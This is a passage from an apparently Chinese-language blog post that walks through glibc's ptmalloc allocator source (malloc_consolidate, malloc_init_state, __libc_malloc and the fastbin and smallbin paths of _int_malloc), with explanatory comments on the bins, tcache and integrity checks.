<span class="hljs-comment">//</span><br>        unsorted_bin = unsorted_chunks(av);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">          then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">          placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">          until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">          reused anyway.</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-comment">// 按照 fd 顺序遍历 fastbin 的每一个 bin，将 bin 中的每一个 chunk 合并掉。</span><br>        maxfb = &amp;fastbin(av, NFASTBINS - <span class="hljs-number">1</span>);<br>        fb    = &amp;fastbin(av, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">do</span> &#123;<br>            p = atomic_exchange_acq(fb, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    check_inuse_chunk(av, p);<br>                    nextp = p-&gt;fd;<br><br>                    <span class="hljs-comment">/* Slightly streamlined version of consolidation code in</span><br><span class="hljs-comment">                     * free() */</span><br>                    size      = chunksize(p);<br>                    nextchunk = chunk_at_offset(p, size);<br>                    nextsize  = chunksize(nextchunk);<br><br>                    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<span class="hljs-comment">//p的前一块空闲马上取出, 计算合并后大小</span><br>                        prevsize = prev_size(p);<br>                        size += prevsize;<br>                        p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>                        unlink(av, p, bck, fwd);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123; <br>                        <span class="hljs-comment">// 判断 nextchunk 是否是空闲的。</span><br>                        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>                        <span class="hljs-keyword">if</span> (!nextinuse) &#123; <span class="hljs-comment">//p的后一块空闲马上取出, 计算合并后大小</span><br>                            size += nextsize;<br>                            unlink(av, nextchunk, bck, fwd);<br>                        &#125; <span class="hljs-keyword">else</span><br>                         <span class="hljs-comment">// 设置 nextchunk 的 prev inuse 为0，以表明可以合并当前 fast chunk。</span><br>                            clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>                        <br>                        <span class="hljs-comment">//插入unsorted bin的常规操作</span><br>                        first_unsorted     = unsorted_bin-&gt;fd;<br>                        unsorted_bin-&gt;fd   = p;<br>                        first_unsorted-&gt;bk = p;<br><br>                        <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>                            p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                            p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                        &#125;<br><br>                        set_head(p, size | PREV_INUSE);<br>                        p-&gt;bk = unsorted_bin;<br>                        p-&gt;fd = first_unsorted;<br>                        set_foot(p, size);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//直接和top chunk合并</span><br>                        size += nextsize;<br>                        set_head(p, size | PREV_INUSE);<br>                        av-&gt;top = p;<br>                    &#125;<br><br>                &#125; <span class="hljs-keyword">while</span> ((p = nextp) != <span class="hljs-number">0</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//如果还没有初始化</span><br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="malloc-init-state"><a href="#malloc-init-state" class="headerlink" title="malloc_init_state"></a>malloc_init_state</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Initialize a malloc_state struct.</span><br><span class="hljs-comment">   This is called from ptmalloc_init () or from _int_new_arena ()</span><br><span class="hljs-comment">   when creating a new arena.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">malloc_init_state</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    mbinptr bin;<br>    <span class="hljs-comment">/* Establish circular links for normal bins */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i)<br>    &#123;<br>        bin = bin_at(av, i);<br>        bin-&gt;fd = bin-&gt;bk = bin; <span class="hljs-comment">//初始化, 把所有指针都指向自己</span><br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> MORECORE_CONTIGUOUS</span><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        set_noncontiguous(av);<br>    <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br>        set_max_fast(DEFAULT_MXFAST);<br>    <span class="hljs-comment">//2.26, 一个arena在默认情况下并不拥有fastbin chunk</span><br>    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">//2.25:</span><br>    av-&gt;flags |= FASTCHUNKS_BIT;<br>    <span class="hljs-comment">//将该areva的top chunk指针指向unsorted bin，用以表示初始时top chunk大小为0</span><br>    av-&gt;top = initial_top(av);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h1><h2 id="–libc-malloc"><a href="#–libc-malloc" class="headerlink" title="  –libc-malloc"></a><span id="__libc_malloc"> </span> <a href="#libcmalloc">–libc-malloc</a></h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//这只是一个_int_malloc函数的简单wrapper</span><br><span class="hljs-keyword">void</span> * __libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim;<br>  <span class="hljs-comment">// 检查是否有内存分配钩子，如果有，调用钩子并返回.</span><br>  <span class="hljs-keyword">void</span> *(*hook) (<span class="hljs-keyword">size_t</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>    <br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes = request2size (bytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  MAYBE_INIT_TCACHE ();<br><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <br>  <span class="hljs-comment">//接着会寻找一个 arena 来试图分配内存</span><br>  arena_get (ar_ptr, bytes);<br>  <span class="hljs-comment">//然后调用 _int_malloc 函数去申请对应的内存</span><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<span class="hljs-comment">//如果分配失败的话，ptmalloc 会尝试再去寻找一个可用的 arena，并分配内存</span><br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<span class="hljs-comment">//如果申请到了 arena，那么在退出之前还得解锁</span><br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>  <span class="hljs-comment">//要么没有申请到内存</span><br>  <span class="hljs-comment">//要么是 mmap 的内存</span><br>  <span class="hljs-comment">//要么申请到的内存必须在其所分配的 arena 中</span><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-comment">//最后返回内存</span><br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="int-malloc-非常之长"><a href="#int-malloc-非常之长" class="headerlink" title="_int_malloc(非常之长)"></a>_int_malloc(非常之长)</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> * _int_malloc (mstate av, <span class="hljs-keyword">size_t</span> bytes)<br></code></pre></div></td></tr></table></figure><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><span class="hljs-comment">//if glibc2.26 and after</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_count;            <span class="hljs-comment">/* count of unsorted chunks processed */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REMOVE_FB(fb, victim, pp)                        \</span><br><span class="hljs-meta">  do                                                        \</span><br><span class="hljs-meta">    &#123;                                                        \</span><br><span class="hljs-meta">      victim = pp;                                        \</span><br><span class="hljs-meta">      <span class="hljs-meta-keyword">if</span> (victim == NULL)                                \</span><br><span class="hljs-meta">        break;                                                \</span><br><span class="hljs-meta">    &#125;                                                        \</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta">         != victim);   </span><br></code></pre></div></td></tr></table></figure><h3 id="简单的check"><a href="#简单的check" class="headerlink" title="简单的check"></a>简单的check</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">     size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">     that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">     aligned.</span><br><span class="hljs-comment">   */</span><br>  checked_request2size (bytes, nb);<br>  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-keyword">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>        alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></div></td></tr></table></figure><ul><li>注意到checked_request2size()是一个宏定义, 可以<strong>改变参数nb的值</strong> </li></ul><h3 id="fastbin-range"><a href="#fastbin-range" class="headerlink" title="fastbin_range"></a>fastbin_range</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br></code></pre></div></td></tr></table></figure><h4 id="2-25"><a href="#2-25" class="headerlink" title="2.25"></a>2.25</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast()))<br>&#123;<br>    idx = fastbin_index(nb);<br>    mfastbinptr *fb = &amp;fastbin(av, idx);<br>    mchunkptr pp = *fb;<br>    <span class="hljs-keyword">do</span> <span class="hljs-comment">//取出第一个fastchunk</span><br>    &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim);<br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="hljs-number">0</span>))<br>        &#123;<span class="hljs-comment">//请求的bytes-&gt;nb-&gt;idx-&gt;fb, 所以idx是按照bytes来确定的, 从这组idx里取出一个fastbinchunk,</span><br>            <span class="hljs-comment">//将他的大小转换为下标, 如果这两个不相等说明fastbin的size段被篡改</span><br>            <span class="hljs-comment">//chunksize(victim) != nb想来也一样吧(?</span><br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>        errout:<br>            malloc_printerr(check_action, errstr, chunk2mem(victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-comment">//检查arena,大小,alignment,chunk_size等等</span><br>        check_remalloced_chunk(av, victim, nb);<br>        <span class="hljs-comment">//返回用户指针</span><br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        <span class="hljs-comment">//如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-26"><a href="#2-26" class="headerlink" title="2.26"></a>2.26</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (get_max_fast ()))<br>    &#123;<br>      idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp;<br>      victim = *fb;<br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>            *fb = victim-&gt;fd;<br>          <span class="hljs-keyword">else</span><br>            REMOVE_FB (fb, pp, victim);<br>          <span class="hljs-keyword">if</span> (__glibc_likely (victim != <span class="hljs-literal">NULL</span>))<br>            &#123;<br>              <span class="hljs-keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));<br>              <span class="hljs-keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="hljs-number">0</span>))<br>                malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>              check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>              <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">                 stash them in the tcache.  */</span><br>              <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);<br>              <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>                &#123;<br>                  mchunkptr tc_victim;<br>                  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>                  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                         &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>                    &#123;<br>                      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>                        *fb = tc_victim-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          REMOVE_FB (fb, pp, tc_victim);<br>                          <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                      tcache_put (tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>              <span class="hljs-keyword">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="smallbin-range-2-27"><a href="#smallbin-range-2-27" class="headerlink" title="smallbin_range 2.27"></a>smallbin_range 2.27</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">     hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">     processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">     anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">   */</span><br><span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>    &#123;<br>        idx = smallbin_index(nb);<br>        bin = bin_at(av, idx);<br><br>        <span class="hljs-keyword">if</span> ((victim = last(bin)) != bin) <span class="hljs-comment">//FIFO</span><br>        &#123;<br>            bck = victim-&gt;bk; <span class="hljs-comment">//取出倒数第二个chunk</span><br>            <span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))<br>                malloc_printerr(<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>            set_inuse_bit_at_offset(victim, nb);<br>            bin-&gt;bk = bck;<br>            bck-&gt;fd = bin;<br><br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena(victim);<br>            check_malloced_chunk(av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>            <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">            stash them in the tcache.  */</span><br>            <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);<br>            <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>            &#123;<br>                mchunkptr tc_victim;<br><br>                <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>                <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>                    &#123;<br>                        bck = tc_victim-&gt;bk;<br>                        set_inuse_bit_at_offset(tc_victim, nb);<br>                        <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                            set_non_main_arena(tc_victim);<br>                        bin-&gt;bk = bck;<br>                        bck-&gt;fd = bin;<br><br>                        tcache_put(tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br>            &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>            <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>            alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="largebin-range"><a href="#largebin-range" class="headerlink" title="largebin_range"></a>largebin_range</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*     If this is a large request, consolidate fastbins before continuing.     </span><br><span class="hljs-comment">    While it might look excessive to kill all fastbins before     </span><br><span class="hljs-comment">    even seeing if there is space available, this avoids     </span><br><span class="hljs-comment">    fragmentation problems normally associated with fastbins.     </span><br><span class="hljs-comment">    Also, in practice, programs tend to have runs of either small or     </span><br><span class="hljs-comment">    large requests, but less often mixtures, so consolidation is not     </span><br><span class="hljs-comment">    invoked all that often in most programs. And the programs that     </span><br><span class="hljs-comment">    it is called frequently in otherwise tend to fragment.   */</span><br><span class="hljs-keyword">else</span><br>&#123;<br>    idx = largebin_index(nb);<br>    <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>        malloc_consolidate(av);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>简而言之就是先执行<a href="#malloc_consolidate">malloc_consolidate</a>(), 合并fastbin中的free chunks</li></ul><h3 id="unsorted-bin-大循环"><a href="#unsorted-bin-大循环" class="headerlink" title="unsorted bin 